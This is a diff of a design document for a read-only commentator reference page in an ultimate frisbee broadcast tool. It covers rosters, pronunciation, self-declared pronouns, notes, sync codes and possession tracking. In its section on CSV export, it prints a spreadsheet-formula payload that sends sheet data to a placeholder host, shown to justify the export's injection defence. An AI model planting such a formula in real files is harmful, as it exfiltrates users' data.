@@ -22,7 +22,7 @@ The Studio decides what a viewer sees. The Commentator page decides what a comme
 | Auth | writes gated, overlay open | read-only throughout |
 | Density | as sparse as possible | as dense as a person can scan |
 
-**The practical consequence is that this is cheap.** It is a read-only page over an API we already poll, with no broadcast risk, no atomic-write store, no operator contention and no preload discipline. It is the least dangerous thing in the project and probably the highest ratio of usefulness to effort.
+The practical consequence is that this is cheap. It is a read-only page over an API we already poll, with no broadcast risk, no atomic-write store, no operator contention and no preload discipline. It is the least dangerous thing in the project and probably the highest ratio of usefulness to effort.
 
 It should also be a **separate page on a separate screen**, never a panel inside the Studio: a commentator and an operator are usually two people, and even when they are one person the two jobs want opposite layouts.
 
@@ -42,7 +42,7 @@ Each entry in the `goals` array of the game payload already carries:
 
 That is a full play-by-play feed, named on both ends of every goal, in a payload the overlays fetch anyway. No new endpoint is needed for the bulk of what a commentator wants.
 
-**And the incompleteness that blocks a graphic does not block a commentator.** A block count that depends on whether that game's scorekeeper recorded Ds (`STUDIO.md` §4) is unusable on a lower-third, because a viewer cannot know it might be short. The same number shown to a commentator, labelled *"3 recorded — may be incomplete"*, is perfectly usable: they are a domain expert who can discount it, and they can simply choose not to say it. **Show it with the caveat rather than withholding it.**
+And the incompleteness that blocks a graphic does not block a commentator. A block count that depends on whether that game's scorekeeper recorded Ds (`STUDIO.md` §4) is unusable on a lower-third, because a viewer cannot know it might be short. The same number shown to a commentator, labelled *"3 recorded — may be incomplete"*, is perfectly usable: they are a domain expert who can discount it, and they can simply choose not to say it. **Show it with the caveat rather than withholding it.**
 
 ## 3. What professional systems do
 
@@ -89,7 +89,7 @@ All of the following come from the goal list, `entity=teams` and `entity=referen
 
 ## 5. Referring to people correctly: numbers, pronunciation, pronouns
 
-**Jersey number is the primary index, not player name.** A commentator sees a number on a shirt and needs the name in the time it takes to say it. Every other lookup is secondary. A page whose rosters are sorted by goals — the obvious way to sort a stats table — is the wrong shape for the job it is actually doing.
+Jersey number is the primary index, not player name. A commentator sees a number on a shirt and needs the name in the time it takes to say it. Every other lookup is secondary. A page whose rosters are sorted by goals — the obvious way to sort a stats table — is the wrong shape for the job it is actually doing.
 
 Three consequences:
 
@@ -101,7 +101,7 @@ Three consequences:
 
 ### Pronunciation
 
-**UltiOrganizer has no pronunciation field anywhere.** Neither `uo_player` nor `uo_player_profile` carries a phonetic spelling, and there is nothing comparable in the schema.
+UltiOrganizer has no pronunciation field anywhere. Neither `uo_player` nor `uo_player_profile` carries a phonetic spelling, and there is nothing comparable in the schema.
 
 This matters more than a missing statistic. Ultimate is international — a WUCC roster mixes Austrian, Finnish, Colombian and Japanese names in a single game — and a commentator mispronouncing a player's name on a public broadcast is a small disrespect to that player, repeated every time they touch the disc. It is also the kind of error the audience notices and the player remembers.
 
@@ -113,13 +113,13 @@ This matters more than a missing statistic. Ultimate is international — a WUCC
 
 Free-text phonetic spelling (*"KLOH-ster-noy-burk"*) beats IPA, because the reader is a commentator under time pressure, not a linguist.
 
-**It probably belongs upstream eventually.** A name's pronunciation is a property of the person, stable across events and useful to every tournament they attend — so `uo_player_profile` is its natural long-term home. That is precisely the graduation path §2.5 of `STUDIO.md` describes: prove it locally, and propose it upstream if the commentary teams actually maintain it.
+It probably belongs upstream eventually. A name's pronunciation is a property of the person, stable across events and useful to every tournament they attend — so `uo_player_profile` is its natural long-term home. That is precisely the graduation path §2.5 of `STUDIO.md` describes: prove it locally, and propose it upstream if the commentary teams actually maintain it.
 
 ### Pronouns
 
 The same class of problem as pronunciation, and arguably a sharper one: how to refer to a person correctly, live, in public, at speed. Ultimate has mixed divisions as a core format and a large number of trans and non-binary players, so a commentator who guesses will get it wrong in front of an audience — repeatedly, since a player is referred to every time they touch the disc.
 
-**Do not infer pronouns from `uo_player_profile.gender`.** That column exists, and using it here would be the single worst mistake this feature could make. It is division-eligibility data — it supports mixed-division ratio rules — and it answers a different question from "how does this person wish to be referred to". Deriving one from the other is precisely the mechanism by which people get misgendered on air, and it would do so automatically and at scale.
+Do not infer pronouns from `uo_player_profile.gender`. That column exists, and using it here would be the single worst mistake this feature could make. It is division-eligibility data — it supports mixed-division ratio rules — and it answers a different question from "how does this person wish to be referred to". Deriving one from the other is precisely the mechanism by which people get misgendered on air, and it would do so automatically and at scale.
 
 So:
 
@@ -132,7 +132,7 @@ Same store as pronunciation, same graduation path — **also built**, as a struc
 
 **On the play view, focus follows risk.** Most rosters are overwhelmingly `he/him` and `she/her`; a commentator's reading habit serves those correctly without looking, and the cost of a lapse concentrates on everyone else. The field panel therefore shows every declared set but emphasises the ones that are neither of those two — keyed on the declared string alone, nothing inferred — and carries the rest of the identity line (nickname, how to say the name) as hover text, so the line keeps its number-to-name scannability. This singles people out, deliberately: the page is a private working surface behind the room code, never on air, protected at the same weight as the rest of the notes store (§5a), and getting a person's pronouns right outranks a uniform-looking list.
 
-**Normalising is prep work, done by hand — and normalising is emptying.** The emphasis rule needs to know which sets are not the everyday two, but nothing is gained by *storing* the everyday two: a commentator reads he or she off the player exactly as they would with no data, so a stored `he/him` is confirmation, not information, and this field keeps only what needs saying. The review panel lists every declared set the rule does not recognise ("He", "she/her/hers", another language, `she/they`, `xe/xem`): a variant that plainly means the everyday reading is **cleared** — one click, the field empties, the row leaves the list — while a genuinely declared set is edited if needed and **kept** exactly as written, emphasised, marked reviewed, and never asked about again. Nothing is ever cleared or kept automatically, and when in doubt the answer is Keep. Editing kept pronouns afterwards drops the reviewed mark, because a new declaration has not been reviewed.
+Normalising is prep work, done by hand — and normalising is emptying. The emphasis rule needs to know which sets are not the everyday two, but nothing is gained by *storing* the everyday two: a commentator reads he or she off the player exactly as they would with no data, so a stored `he/him` is confirmation, not information, and this field keeps only what needs saying. The review panel lists every declared set the rule does not recognise ("He", "she/her/hers", another language, `she/they`, `xe/xem`): a variant that plainly means the everyday reading is **cleared** — one click, the field empties, the row leaves the list — while a genuinely declared set is edited if needed and **kept** exactly as written, emphasised, marked reviewed, and never asked about again. Nothing is ever cleared or kept automatically, and when in doubt the answer is Keep. Editing kept pronouns afterwards drops the reviewed mark, because a new declaration has not been reviewed.
 
 One amendment this makes to the bullets above: within this desk-side store, an empty field and "declared the everyday set" collapse into one state — in both, the commentator uses the name and the everyday pronoun. The distinction stays load-bearing upstream, where a profile field is self-declared and published under consent; here the store is a working surface, and it stores exceptions rather than confirmations.
 
@@ -186,11 +186,11 @@ The genuine nuance is narrower, and it is a design consequence rather than a leg
 
 Each is one line, and each is optional.
 
-**The authoritative list is the code, not this table.** `PROMPTS` and `FIELDS` in [`../shared/bios.js`](../shared/bios.js) are what the exported sheet actually asks for; this table is why. The two drift the moment a field is added to one of them, so when they disagree the code is right — and several of the rows above were added only after a roster built by another broadcast turned out to collect them.
+The authoritative list is the code, not this table. `PROMPTS` and `FIELDS` in [`../shared/bios.js`](../shared/bios.js) are what the exported sheet actually asks for; this table is why. The two drift the moment a field is added to one of them, so when they disagree the code is right — and several of the rows above were added only after a roster built by another broadcast turned out to collect them.
 
-**Same home, same edit surface, same consent mechanism as pronunciation and pronouns:** `uo_player_profile`, self-edited through `user/playerprofile.php`, published only if the player adds the field to the `public` whitelist. That is what makes this a cheap ask rather than a large one — the storage, the player-owned edit page, the per-field opt-in and the privacy obligations all exist, and these fields join them rather than creating anything new.
+Same home, same edit surface, same consent mechanism as pronunciation and pronouns: `uo_player_profile`, self-edited through `user/playerprofile.php`, published only if the player adds the field to the `public` whitelist. That is what makes this a cheap ask rather than a large one — the storage, the player-owned edit page, the per-field opt-in and the privacy obligations all exist, and these fields join them rather than creating anything new.
 
-**But unlike pronunciation, a desk cannot author this.** A broadcast team can research a phonetic spelling and type it in; nobody can supply a player's hobbies on their behalf. The one overlay-local route is therefore the bio round trip (§5a), where each player writes their own row — and that is a bridge with a room's lifetime, gathered again for every tournament, not a home. The durable version is upstream or it does not exist.
+But unlike pronunciation, a desk cannot author this. A broadcast team can research a phonetic spelling and type it in; nobody can supply a player's hobbies on their behalf. The one overlay-local route is therefore the bio round trip (§5a), where each player writes their own row — and that is a bridge with a room's lifetime, gathered again for every tournament, not a home. The durable version is upstream or it does not exist.
 
 Three things to get right, each of them a rule already stated elsewhere in these documents:
 
@@ -198,13 +198,13 @@ Three things to get right, each of them a rule already stated elsewhere in these
 - **Never inferred, never filled in by somebody else.** Player-authored or nothing, exactly as for pronouns above. The stakes are lower than they are for pronouns, but the failure is the same one: a guess said on air is heard as the player's own words.
 - **This is the first data on the page with no verification path at all.** A statistic can be incomplete and can be labelled as such (§2); a biography can simply be out of date — a job left two years ago, a club no longer played for — and nothing in the system will ever notice. So carry when the profile was last edited, and present these as the player's words rather than as facts the tournament is asserting. A commentator who knows the provenance says "he told us" instead of "he is".
 
-**And none of it is reachable today, including the fields that already exist** — the subsection above applies unchanged. Exposing `uo_player_profile` through a Live! payload at all is a prerequisite for any of this, and it is the cheaper half of the work.
+And none of it is reachable today, including the fields that already exist — the subsection above applies unchanged. Exposing `uo_player_profile` through a Live! payload at all is a prerequisite for any of this, and it is the cheaper half of the work.
 
 ## 5a. Prepared talking points, typed by the commentator — **built**
 
 Everything in the subsection above is an upstream ask, which means it is worth nothing this season. This is the part that could be built without waiting for anybody, and it is the lowest-hanging thing on the page.
 
-**The case is specific rather than general.** At a large tournament the commentary position is staffed all week and material can be prepared properly. At a smaller one there are commentators for the finals and nobody before that, and the way material actually reaches them is that somebody asks the two teams for something to say and is handed it an hour before the pull — by email, in a message, or verbally. There is no UltiOrganizer surface for that, and there will not be one before the game starts. So the commentator types it in here.
+The case is specific rather than general. At a large tournament the commentary position is staffed all week and material can be prepared properly. At a smaller one there are commentators for the finals and nobody before that, and the way material actually reaches them is that somebody asks the two teams for something to say and is handed it an hour before the pull — by email, in a message, or verbally. There is no UltiOrganizer surface for that, and there will not be one before the game starts. So the commentator types it in here.
 
 That does not make §5's ask redundant. A self-declared profile field is still the right destination: it is authored by the person it describes, it follows them between tournaments, and it carries consent. This is what a desk does in the absence of one, and it should be read as scaffolding rather than as the answer.
 
@@ -226,9 +226,9 @@ The marker is a dot, and three things about it were settled by measurement rathe
 
 A line selection is worthless five minutes after the point ends. A note about a player is worth exactly as much in the final as it was in the quarter. Keying notes by game would make a desk retype everything each round, which is the surest way to have them stop doing it by lunchtime. So the room is the code, and a desk that keeps its code keeps its notes for the tournament.
 
-**Codes are still generated per game, and carrying notes between games is a deliberate act rather than an automatic one.** A revision of this feature made a game with no stored code inherit the last code the browser used, so that notes would follow a desk from round to round. That was withdrawn, and the reason is worth keeping because it is not about notes at all.
+Codes are still generated per game, and carrying notes between games is a deliberate act rather than an automatic one. A revision of this feature made a game with no stored code inherit the last code the browser used, so that notes would follow a desk from round to round. That was withdrawn, and the reason is worth keeping because it is not about notes at all.
 
-**The sync code is not only a namespace — it is also the possession-write credential.** The Studio operator nominates a code per game, and the desk holding it may declare possession, which feeds break chance, clean holds and the turnover count on the scoreboard bug (§6, `STUDIO.md` §10.4). Possession reaches air. So making the code sticky across fixtures would have taken a convenience for a private reference panel and quietly widened what can change a broadcast: a desk nominated on one game would arrive at the next already holding the code. Two very different consequences ride one value, and the gate has to match the larger of them.
+The sync code is not only a namespace — it is also the possession-write credential. The Studio operator nominates a code per game, and the desk holding it may declare possession, which feeds break chance, clean holds and the turnover count on the scoreboard bug (§6, `STUDIO.md` §10.4). Possession reaches air. So making the code sticky across fixtures would have taken a convenience for a private reference panel and quietly widened what can change a broadcast: a desk nominated on one game would arrive at the next already holding the code. Two very different consequences ride one value, and the gate has to match the larger of them.
 
 The general lesson, which applies to anything else added to this page: **before making a value more persistent, check everything that value authorises.** The reasoning for the change was entirely about notes and entirely correct about notes, and it was still wrong.
 
@@ -238,7 +238,7 @@ It also removes the trap `Lines::prune()` fell into. There, rooms have to be bou
 
 ### Saving
 
-**On a pause in typing, and again on blur and on close — never on a button.** There is no good failure mode for a Save button here: a commentator who has typed a paragraph and closes the dialog has lost it, and will not find out until the moment they wanted it. The box says `Unsaved` / `Saving…` / `Saved` so the state is never a guess, and a failed write says *"Not shared — kept on this screen"* rather than pretending, because the local text is still there and still usable.
+On a pause in typing, and again on blur and on close — never on a button. There is no good failure mode for a Save button here: a commentator who has typed a paragraph and closes the dialog has lost it, and will not find out until the moment they wanted it. The box says `Unsaved` / `Saving…` / `Saved` so the state is never a guess, and a failed write says *"Not shared — kept on this screen"* rather than pretending, because the local text is still there and still usable.
 
 An empty box **deletes** rather than storing a blank. A blank entry would still count against the room's cap and still hold its own expiry clock.
 
@@ -253,7 +253,7 @@ Every other store here holds facts about a game. This holds what a commentator w
 
 ### The code is masked, on both surfaces
 
-**A namespace nobody can guess is exactly what these guarantees rest on — and a code printed on screen all day is not unguessable, it is published.** Both the commentary booth and the operator's station are among the most-walked-past screens at a tournament, and five characters are memorable at a glance. Saying "it is a namespace, not a credential" describes what the code *is not*; it does not excuse handing it to anyone who walks past.
+A namespace nobody can guess is exactly what these guarantees rest on — and a code printed on screen all day is not unguessable, it is published. Both the commentary booth and the operator's station are among the most-walked-past screens at a tournament, and five characters are memorable at a glance. Saying "it is a namespace, not a credential" describes what the code *is not*; it does not excuse handing it to anyone who walks past.
 
 So `shared/secret.js` masks both fields by default, with a Show button that reveals and **re-masks itself after thirty seconds**. The auto-hide is the part that does the work: "reveal, read it out, forget to hide it again" is the real failure mode, and a manual toggle alone would spend a tournament in the revealed state.
 
@@ -265,7 +265,7 @@ Three details, the last of which corrects an earlier draft of this section:
 
 ### Retention: notes are gathered for one broadcast and then deleted
 
-**A note lasts seven days from its last edit, and the sweep runs on read as well as on write.**
+A note lasts seven days from its last edit, and the sweep runs on read as well as on write.
 
 Both halves were needed. The first implementation expired rooms after fourteen days but pruned only when something was written — which meant a tournament that finished and was never written to again kept its notes forever, exactly the case a retention limit exists for. Now any read of any room clears everything past the limit, so the next desk to open the page is what cleans up after the last one. There is no cron, nothing to install, and nothing that depends on a tournament remembering to tidy up.
 
@@ -289,11 +289,11 @@ export CSV (identifier + name, empty prompt columns)
   -> import here
 ```
 
-**Standalone, the same file also creates the squad.** Hosted, a row for somebody not on the roster is rejected and must be: the squad is UltiOrganizer's, it is registered and accredited, and an import that invented people would produce a roster disagreeing with the tournament's own on the surface that reaches air. Standalone there is no such list — `install/make-event.php` writes teams with empty squads on purpose, because nobody should type forty names into a JSON file — so a row with a name and no identifier is a person to add, and the import offers to add them before it writes anything.
+Standalone, the same file also creates the squad. Hosted, a row for somebody not on the roster is rejected and must be: the squad is UltiOrganizer's, it is registered and accredited, and an import that invented people would produce a roster disagreeing with the tournament's own on the surface that reaches air. Standalone there is no such list — `install/make-event.php` writes teams with empty squads on purpose, because nobody should type forty names into a JSON file — so a row with a name and no identifier is a person to add, and the import offers to add them before it writes anything.
 
 Beside the Import button there is also a number-and-name field, for the player who turned up unlisted. Both doors write to `shared/roster.php`, which 404s under a host. Adding is idempotent **on name**, so re-running an import — the thing people do when they are not sure it worked — adds nobody twice; and a removed player's id is never handed to somebody else, because those ids are what the notes on this page are filed under.
 
-**A shared document the players fill in themselves is a better shape than a commentator's notebook in every way that matters**, and it is the principle §5 argues for the upstream profile fields, reached without waiting for a schema change:
+A shared document the players fill in themselves is a better shape than a commentator's notebook in every way that matters, and it is the principle §5 argues for the upstream profile fields, reached without waiting for a schema change:
 
 - **The player writes their own entry**, so it is self-declared rather than second-hand — which answers the sharpest objection to this whole feature, that it is one person's unverifiable words about another.
 - **It gives players agency at the point where agency means something.** A player can add, edit or remove their own line while the document is still open, before the game. A note typed at the desk gives them no such moment.
@@ -329,13 +329,13 @@ Every rejection is reported rather than dropped. A silent import is how the wron
 
 A CSV is also the format the source is *already* in: a team collecting player answers is collecting them in a spreadsheet, one row per player, with the jersey number already a column.
 
-**`FileReader` reads it locally and the page posts the result through the endpoint that already exists.** No upload handling, no temp files, no new server surface, and it works with the network down.
+`FileReader` reads it locally and the page posts the result through the endpoint that already exists. No upload handling, no temp files, no new server surface, and it works with the network down.
 
 **The Google-workflow question, decided.** Since the destination is usually a Google Sheet anyway, three integrations were considered. A **Copy for Sheets** button is built: the same table onto the clipboard as TSV, a fresh `sheets.new` tab, paste — no download step, no OAuth, no dependency, and it degrades to nothing offline. A full Drive/OAuth integration ("create the sheet for me") was declined: it would demand a Google Cloud project, client id and consent-screen process from **every installation**, plus a third-party script on an operator page that has no external dependencies — setup friction this project avoids everywhere else. And import-by-URL from a shared sheet was declined on privacy rather than technics: it only works on a document set to "anyone with the link", and this document carries player personal data including pronouns. A workflow that nudges every team toward making that link-public points the opposite way from everything else in this store; the private download costs two clicks and keeps the document private.
 
-**The export marks formula-looking cells as text.** This is CSV injection, and it applies here because the export carries **player names out of the database** into a file the team opens in Sheets or Excel. A player named `=HYPERLINK("http://x/?"&A1,"hi")` is a formula that runs when the team opens the sheet, and in Sheets that is enough to exfiltrate the rest of the document. Quoting does *not* prevent it — both applications evaluate a formula inside a quoted field — so any cell beginning `=`, `+`, `-`, `@`, tab or CR is prefixed with an apostrophe, the spreadsheet's own "this is text" marker. Ordinary names and numbers are untouched, and a neutralised name still matches its roster entry on the way back, because the name comparison ignores punctuation.
+The export marks formula-looking cells as text. This is CSV injection, and it applies here because the export carries **player names out of the database** into a file the team opens in Sheets or Excel. A player named `=HYPERLINK("http://x/?"&A1,"hi")` is a formula that runs when the team opens the sheet, and in Sheets that is enough to exfiltrate the rest of the document. Quoting does *not* prevent it — both applications evaluate a formula inside a quoted field — so any cell beginning `=`, `+`, `-`, `@`, tab or CR is prefixed with an apostrophe, the spreadsheet's own "this is text" marker. Ordinary names and numbers are untouched, and a neutralised name still matches its roster entry on the way back, because the name comparison ignores punctuation.
 
-**`shared/csv.js` is a real parser, not `split(',')`**, and it is tested directly rather than through the page. Quoted fields containing commas and newlines are normal in exactly this content — *"Handball, then ultimate at university"* is one field — and splitting on commas truncates the note and shifts every later column, silently, on a file that looks fine in a spreadsheet. It also sniffs the delimiter outside quotes (a European Excel writes semicolons, and the commas inside a quoted answer outnumber them), strips the UTF-8 BOM Excel writes, and accepts all three line endings.
+`shared/csv.js` is a real parser, not `split(',')`, and it is tested directly rather than through the page. Quoted fields containing commas and newlines are normal in exactly this content — *"Handball, then ultimate at university"* is one field — and splitting on commas truncates the note and shifts every later column, silently, on a file that looks fine in a spreadsheet. It also sniffs the delimiter outside quotes (a European Excel writes semicolons, and the commas inside a quoted answer outnumber them), strips the UTF-8 BOM Excel writes, and accepts all three line endings.
 
 #### What the export contains
 
@@ -383,9 +383,9 @@ Where they *do* overlap — both editing one team — take last-write-wins and s
 
 #### How two commentators find each other: a shared code, not a login
 
-**Do not gate this behind the Live! admin session.** That credential exists to control what goes on air. A commentator wants to sync a private reference panel with a colleague; handing them broadcast control to do it is an escalation for no reason — anyone who could sync could also blank the graphics mid-point. Two different jobs, two very different blast radii.
+Do not gate this behind the Live! admin session. That credential exists to control what goes on air. A commentator wants to sync a private reference panel with a colleague; handing them broadcast control to do it is an escalation for no reason — anyone who could sync could also blank the graphics mid-point. Two different jobs, two very different blast radii.
 
-**A shared code is the right shape, and it is worth naming what it is: a namespace, not authentication.** It answers "which shared session am I in", not "am I allowed in". Saying so plainly matters, because nobody should believe it is protecting anything.
+A shared code is the right shape, and it is worth naming what it is: a namespace, not authentication. It answers "which shared session am I in", not "am I allowed in". Saying so plainly matters, because nobody should believe it is protecting anything.
 
 That is acceptable *here* and nowhere else in this system, for the reason §1 gives: nothing on this page reaches a viewer. The worst case of a guessed code is that a stranger sees, or edits, a line selection on somebody's private reference screen. Compare show state, where a bad write changes the broadcast — which is exactly why that one *is* admin-gated. The gate should match the consequence, and the consequences differ by orders of magnitude.
 
@@ -396,9 +396,9 @@ Practical properties that make it fit the setting:
 - **Scopes naturally**: the room is the code plus the game id, so the same code at two fields does not collide.
 - **Opt-in.** A commentator working alone needs no code and should never be asked for one; entering a code is what turns sharing on.
 
-**One thing to guard, and it is genuinely new.** This is the first place in the whole system where an *unauthenticated* request writes to disk — everything else writable sits behind the admin session. On a tournament LAN that is a non-issue; on a public host it is a small abuse surface. So the store carries the boring defences: a short fixed charset and length for codes, a cap on players per team, caps on rooms, pruning of rooms untouched for hours, and a minimum interval between writes to one room.
+One thing to guard, and it is genuinely new. This is the first place in the whole system where an *unauthenticated* request writes to disk — everything else writable sits behind the admin session. On a tournament LAN that is a non-issue; on a public host it is a small abuse surface. So the store carries the boring defences: a short fixed charset and length for codes, a cap on players per team, caps on rooms, pruning of rooms untouched for hours, and a minimum interval between writes to one room.
 
-**Two of those caps were wrong when first written, and the way they were wrong is worth keeping on the page**, because both are the same mistake: a limit that looks like a bound but is not one.
+Two of those caps were wrong when first written, and the way they were wrong is worth keeping on the page, because both are the same mistake: a limit that looks like a bound but is not one.
 
 | cap | what it looked like | why it bounded nothing |
 |---|---|---|
@@ -407,7 +407,7 @@ Practical properties that make it fit the setting:
 
 The general lesson for anything else unauthenticated here: **check what the attacker controls, not what the caller is expected to send.** Both caps were correct for the shape of a real request and irrelevant to the shape of a hostile one.
 
-**Assignment should be explicit, not inferred.** A small "I am covering …" control, remembered per browser. Two people silently editing the same team is the one case that produces confusion, and naming who has which team removes it.
+Assignment should be explicit, not inferred. A small "I am covering …" control, remembered per browser. Two people silently editing the same team is the one case that produces confusion, and naming who has which team removes it.
 
 ### Entry has to be fast
 
@@ -422,7 +422,7 @@ Lines change every point, and a point can end in fifteen seconds. So:
 
 A commentary duo splits the teams; a third person — a **spotter** — can instead track **who currently holds the disc**. That single input is worth more than anything else discussed in these documents, because *possession changes fall out of it implicitly*. Nobody records a turnover: the disc simply passes from a player on one team to a player on the other, and that transition **is** the turnover.
 
-**Why a spotter is the right person, where nobody else was.** Two candidates were considered for possession capture and both had the same flaw (`STUDIO.md` §10.4): the scorekeeper is already tracking goals, assists, timeouts and the clock, and the broadcast operator is directing — for both, possession is *additional* work competing with their real job. A spotter watching the disc is not doing a second job. That is the entire job. It is the first proposal where the capture cost is not stolen from something else.
+Why a spotter is the right person, where nobody else was. Two candidates were considered for possession capture and both had the same flaw (`STUDIO.md` §10.4): the scorekeeper is already tracking goals, assists, timeouts and the clock, and the broadcast operator is directing — for both, possession is *additional* work competing with their real job. A spotter watching the disc is not doing a second job. That is the entire job. It is the first proposal where the capture cost is not stolen from something else.
 
 **Record the turnover, not the holder.** Tracking who has the disc at every moment is *continuous state maintenance* — a tap every few seconds, all game. Recording turnovers is *discrete event capture* — a handful of taps per point. Same output, far less input, and the difference is not only effort:
 
@@ -471,13 +471,13 @@ The screen still shows state — current possession, the last few events, the li
 
 **Holder tracking stays on the shelf.** It is the only route to touches per player and possession time, which nothing else can give — but it is a different order of effort and its failures are worse. Revisit only if someone has run the event-based version through a full game and wants more.
 
-**Line data makes this feasible, which is why the two belong together.** With the line known (§6 above), a holder selector offers *seven* buttons rather than a twenty-player roster — and after a catch the likely next holders are the same seven. Without line data it is a search problem under time pressure; with it, it is a seven-way tap. Neither feature needs the other, but each makes the other markedly more usable.
+Line data makes this feasible, which is why the two belong together. With the line known (§6 above), a holder selector offers *seven* buttons rather than a twenty-player roster — and after a catch the likely next holders are the same seven. Without line data it is a search problem under time pressure; with it, it is a seven-way tap. Neither feature needs the other, but each makes the other markedly more usable.
 
 **One limitation to be honest about.** Tracking the holder distinguishes *which team* lost the disc and *who was holding it*, but not whether a failed pass was a throwaway or a drop — the thrower is the holder in both cases, so the receiver's error is attributed to the thrower. Conventional ultimate statistics separate those. So this yields level A of `STUDIO.md` §10.4 cleanly and only an approximation of level B, and a per-player turnover column built on it would be quietly unfair to throwers.
 
-**Persist it per game, and plan to send it somewhere.** A spotter's full attention across a game is a real cost, and data that is collected and then overwritten by the next fixture wastes it — every event would re-collect from scratch. One file per game and an export are the minimum; the actual destination is UltiOrganizer, so the record survives the broadcast and reaches teams and season statistics rather than sitting on a laptop. `STUDIO.md` §10.4 carries that as part of the upstream request.
+Persist it per game, and plan to send it somewhere. A spotter's full attention across a game is a real cost, and data that is collected and then overwritten by the next fixture wastes it — every event would re-collect from scratch. One file per game and an export are the minimum; the actual destination is UltiOrganizer, so the record survives the broadcast and reaches teams and season statistics rather than sitting on a laptop. `STUDIO.md` §10.4 carries that as part of the upstream request.
 
-**And the same rule as everywhere else: never authoritative.** A spotter's stream is overlay state. It must not be written back into the scoresheet, and putting anything derived from it on air is the separate decision described below. Persisting it does not change that — a kept file is still a broadcast artefact, not a result.
+And the same rule as everywhere else: never authoritative. A spotter's stream is overlay state. It must not be written back into the scoresheet, and putting anything derived from it on air is the separate decision described below. Persisting it does not change that — a kept file is still a broadcast artefact, not a result.
 
 ### What it unlocks, and one thing to be careful about
 
@@ -489,9 +489,9 @@ It also answers the "who is on this point" graphic that `STUDIO.md` §10.2 lists
 
 Ticks in each team's header, one per allowance, filled while unspent, with the words in the title: *"Valley Vipers: 1 of 2 left this half."*
 
-**It is a derivation, and the half-reset is why it is not a count.** `poolinfo.timeouts` is the allowance; each one taken is a `gameevents` entry of type `timeout` carrying `ishome`. When `timeoutsper` is `half` the allowance **resets at the break**, marked by a `half_cap` event — so a team that spent both before halftime has two again after it. That is exactly the sort of thing a commentator cannot hold across two teams and forty minutes, and exactly the sort of thing a second implementation gets wrong: it is invisible for the whole first half of every game, so a defect in it would ship, look right all morning, and start lying after the break. It lives in `shared/timeouts.js`, tested directly, and the scoreboard calls the same function.
+It is a derivation, and the half-reset is why it is not a count. `poolinfo.timeouts` is the allowance; each one taken is a `gameevents` entry of type `timeout` carrying `ishome`. When `timeoutsper` is `half` the allowance **resets at the break**, marked by a `half_cap` event — so a team that spent both before halftime has two again after it. That is exactly the sort of thing a commentator cannot hold across two teams and forty minutes, and exactly the sort of thing a second implementation gets wrong: it is invisible for the whole first half of every game, so a defect in it would ship, look right all morning, and start lying after the break. It lives in `shared/timeouts.js`, tested directly, and the scoreboard calls the same function.
 
-**Null, not zero, when the pool gives no timeouts.** Absent is not zero (`AGENTS.md`): a pool with no allowance recorded is not a pool where both sides have spent everything, so the ticks are absent rather than empty.
+Null, not zero, when the pool gives no timeouts. Absent is not zero (`AGENTS.md`): a pool with no allowance recorded is not a pool where both sides have spent everything, so the ticks are absent rather than empty.
 
 **Not on the Studio, deliberately.** The operator is watching the programme output, and the programme output already shows these ticks on the scoreboard. Adding them to the Studio would mean giving that page its first game-detail payload — it holds none today — to duplicate something already on the operator's screen.
 
@@ -513,13 +513,13 @@ What remains in the body is a **reading**, not a control: turnovers this point, 
 
 The buttons are smaller than the ones they replace, which is a real cost — the body versions were deliberately large to be hit without looking. Being permanently on screen is worth more than being large, because a button that has scrolled off cannot be hit at any size. The keyboard is unchanged and remains the fast path: `O`, `D`, `I`, `U`.
 
-**Team stats sit at the bottom of this view**, the opposite of the prep view. There the squads scroll and the short block belongs on top so it never leaves the screen; here nothing scrolls, and a season record does not change while a point is being played.
+Team stats sit at the bottom of this view, the opposite of the prep view. There the squads scroll and the short block belongs on top so it never leaves the screen; here nothing scrolls, and a season record does not change while a point is being played.
 
 ## 6b. Gender ratio
 
 Mixed divisions only, decided the way UltiOrganizer's own scoresheet decides it — the division name contains "mixed" (`cust/wfdf/pdfscoresheet.php:142`).
 
-**The pattern is derivable; the labels are not.** WFDF's prescribed ratio runs A B B A · A B B A over successive points, so points 1, 4, 5, 8, 9, 12 … repeat the first point's ratio and the rest carry the other. That is taken from the same source as the printed sheet (`pdfscoresheet.php:1254`, which marks exactly those points with an asterisk), so a commentator reading this screen and a scorekeeper reading the paper cannot disagree.
+The pattern is derivable; the labels are not. WFDF's prescribed ratio runs A B B A · A B B A over successive points, so points 1, 4, 5, 8, 9, 12 … repeat the first point's ratio and the rest carry the other. That is taken from the same source as the printed sheet (`pdfscoresheet.php:1254`, which marks exactly those points with an asterisk), so a commentator reading this screen and a scorekeeper reading the paper cannot disagree.
 
 What UltiOrganizer does *not* record is which ratio was chosen for point 1 — it is circled by hand on the scoresheet and nothing sends it back. So the panel asks once and only then names actual ratios. The answer is stored **with the game**, in the possession store, rather than in this browser: the stage's progression card needs the same fact, and a per-browser copy meant the person calling the game and the graphic going out could quietly disagree. Whoever holds the room code can set it, for the same reason they can set possession. Until it is set it shows the pattern rather than guessing, because guessing wrong is wrong for the entire game rather than for one point.
 
@@ -527,11 +527,11 @@ The ratios themselves come from the season type: outdoor is 4MMP/3FMP against 3M
 
 It shows the current point and the next three, because the useful call is "this one and the next are 4MMP, then it flips" rather than a single value. Each is one line: the point number is a caption for the ratio, not a second fact.
 
-**Ratios are written as one side, not two.** `4MMP` rather than `4MMP/3FMP` — on a seven-a-side line four MMP means three FMP and there is nothing else it could be. The saving in characters is the smaller reason; the real one is that writing both halves forces a decision about which category is printed first, every time a ratio appears, and there is no good answer to that.
+Ratios are written as one side, not two. `4MMP` rather than `4MMP/3FMP` — on a seven-a-side line four MMP means three FMP and there is nothing else it could be. The saving in characters is the smaller reason; the real one is that writing both halves forces a decision about which category is printed first, every time a ratio appears, and there is no good answer to that.
 
-**The selector for point 1 is in the toolbar**, with the code and the other setup. It is answered once per game and then never touched, so it has no business taking a block in the panel that is read between every point.
+The selector for point 1 is in the toolbar, with the code and the other setup. It is answered once per game and then never touched, so it has no business taking a block in the panel that is read between every point.
 
-**An unlinked desk may declare it too — on that screen alone.** The ratio is read off the paper scoresheet, and a desk that never links must not lose the ABBA panel and the picker assist over it. The declaration is kept in that browser, labelled "this screen only" wherever it shows, and the shared value stays the authority: the moment one exists it wins, the local one is dropped, and the takeover is said once in the panel rather than silently relabelling the points. Nothing local ever enters the room as a side effect — once the desk is linked, sharing the local value is its own one-click offer, because an unshared guess must not reach the stage just because a code was typed.
